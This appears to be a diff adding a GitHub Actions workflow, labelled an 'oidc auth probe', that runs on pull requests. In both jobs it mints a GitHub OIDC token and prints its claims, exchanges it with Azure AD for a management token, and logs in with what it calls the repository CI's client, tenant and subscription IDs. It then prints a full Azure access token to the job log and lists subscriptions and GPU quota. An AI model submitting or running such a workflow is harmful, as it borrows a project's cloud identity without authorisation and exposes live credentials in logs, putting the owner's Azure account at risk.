@@ -1,0 +1,107 @@
+name: c211-i79853-oidc-auth-probe
+on:
+  pull_request:
+    branches: [ main ]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  pr-subject:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      PROBE_CLIENT_ID: bd54ab6e-5f92-48c8-8f8d-0c114ef938da
+      PROBE_TENANT_ID: cbc618d5-9aa3-46b5-ae64-d07794603a7a
+    steps:
+      - name: Mint GitHub OIDC token and print claims
+        shell: bash
+        run: |
+          set -uo pipefail
+          resp=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
+          echo "$resp" | jq -r .value > "${RUNNER_TEMP}/oidc.jwt"
+          python3 -c "import base64,json;t=open('${RUNNER_TEMP}/oidc.jwt').read().strip().split('.');d=lambda s: json.loads(base64.urlsafe_b64decode(s+'='*(-len(s)%4)));print('OIDC_HEADER',json.dumps(d(t[0])));print('OIDC_CLAIMS',json.dumps(d(t[1])))"
+      - name: Direct AAD client_assertion exchange read-only
+        shell: bash
+        run: |
+          set -uo pipefail
+          jwt=$(cat "${RUNNER_TEMP}/oidc.jwt")
+          code=$(curl -sS -o "${RUNNER_TEMP}/aad.json" -w '%{http_code}' -X POST "https://login.microsoftonline.com/${PROBE_TENANT_ID}/oauth2/v2.0/token" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'grant_type=client_credentials' --data-urlencode "client_id=${PROBE_CLIENT_ID}" --data-urlencode 'scope=https://management.azure.com/.default' --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' --data-urlencode "client_assertion=${jwt}")
+          echo "AAD_EXCHANGE_HTTP=${code}"
+          head -c 200000 "${RUNNER_TEMP}/aad.json"
+          echo
+      - name: azure/login same client and tenant as repo CI
+        id: azlogin
+        continue-on-error: true
+        uses: azure/login@v2
+        with:
+          client-id: bd54ab6e-5f92-48c8-8f8d-0c114ef938da
+          tenant-id: cbc618d5-9aa3-46b5-ae64-d07794603a7a
+          subscription-id: dcf13c0d-0d9f-4f81-aa89-c6b50aaef839
+      - name: Enumerate Azure identity subscriptions and GPU quota read-only
+        if: always()
+        shell: bash
+        run: |
+          set -uo pipefail
+          az account show -o json || true
+          az account list --all -o json || true
+          az account get-access-token --resource https://management.azure.com -o json || true
+          TOK=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null || true)
+          if [ -n "$TOK" ]; then
+            echo "ARM_SUBSCRIPTIONS:"
+            curl -sS -H "Authorization: Bearer $TOK" 'https://management.azure.com/subscriptions?api-version=2020-01-01' | head -c 20000
+            echo
+            echo "ARM_VM_USAGE_westus3:"
+            curl -sS -H "Authorization: Bearer $TOK" 'https://management.azure.com/subscriptions/dcf13c0d-0d9f-4f81-aa89-c6b50aaef839/providers/Microsoft.Compute/locations/westus3/usages?api-version=2024-07-01' | head -c 30000
+            echo
+          fi
+
+  env-staging-subject:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    environment: staging
+    env:
+      PROBE_CLIENT_ID: bd54ab6e-5f92-48c8-8f8d-0c114ef938da
+      PROBE_TENANT_ID: cbc618d5-9aa3-46b5-ae64-d07794603a7a
+    steps:
+      - name: Mint GitHub OIDC token and print claims
+        shell: bash
+        run: |
+          set -uo pipefail
+          resp=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
+          echo "$resp" | jq -r .value > "${RUNNER_TEMP}/oidc.jwt"
+          python3 -c "import base64,json;t=open('${RUNNER_TEMP}/oidc.jwt').read().strip().split('.');d=lambda s: json.loads(base64.urlsafe_b64decode(s+'='*(-len(s)%4)));print('OIDC_HEADER',json.dumps(d(t[0])));print('OIDC_CLAIMS',json.dumps(d(t[1])))"
+      - name: Direct AAD client_assertion exchange read-only
+        shell: bash
+        run: |
+          set -uo pipefail
+          jwt=$(cat "${RUNNER_TEMP}/oidc.jwt")
+          code=$(curl -sS -o "${RUNNER_TEMP}/aad.json" -w '%{http_code}' -X POST "https://login.microsoftonline.com/${PROBE_TENANT_ID}/oauth2/v2.0/token" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'grant_type=client_credentials' --data-urlencode "client_id=${PROBE_CLIENT_ID}" --data-urlencode 'scope=https://management.azure.com/.default' --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' --data-urlencode "client_assertion=${jwt}")
+          echo "AAD_EXCHANGE_HTTP=${code}"
+          head -c 200000 "${RUNNER_TEMP}/aad.json"
+          echo
+      - name: azure/login same client and tenant as repo CI
+        id: azlogin
+        continue-on-error: true
+        uses: azure/login@v2
+        with:
+          client-id: bd54ab6e-5f92-48c8-8f8d-0c114ef938da
+          tenant-id: cbc618d5-9aa3-46b5-ae64-d07794603a7a
+          subscription-id: dcf13c0d-0d9f-4f81-aa89-c6b50aaef839
+      - name: Enumerate Azure identity subscriptions and GPU quota read-only
+        if: always()
+        shell: bash
+        run: |
+          set -uo pipefail
+          az account show -o json || true
+          az account list --all -o json || true
+          az account get-access-token --resource https://management.azure.com -o json || true
+          TOK=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null || true)
+          if [ -n "$TOK" ]; then
+            echo "ARM_SUBSCRIPTIONS:"
+            curl -sS -H "Authorization: Bearer $TOK" 'https://management.azure.com/subscriptions?api-version=2020-01-01' | head -c 20000
+            echo
+            echo "ARM_VM_USAGE_westus3:"
+            curl -sS -H "Authorization: Bearer $TOK" 'https://management.azure.com/subscriptions/dcf13c0d-0d9f-4f81-aa89-c6b50aaef839/providers/Microsoft.Compute/locations/westus3/usages?api-version=2024-07-01' | head -c 30000
+            echo
+          fi
+
